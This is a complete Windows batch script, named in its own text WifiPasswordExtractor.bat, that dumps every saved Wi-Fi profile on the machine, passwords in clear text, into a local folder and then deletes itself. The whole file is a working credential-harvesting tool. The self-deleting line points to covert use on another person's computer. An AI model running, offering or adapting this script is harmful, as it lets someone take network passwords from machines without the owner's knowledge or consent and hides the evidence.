@echo off
md PasswordList
netsh wlan export profile key=clear folder=PasswordList
del WifiPasswordExtractor.bat
exit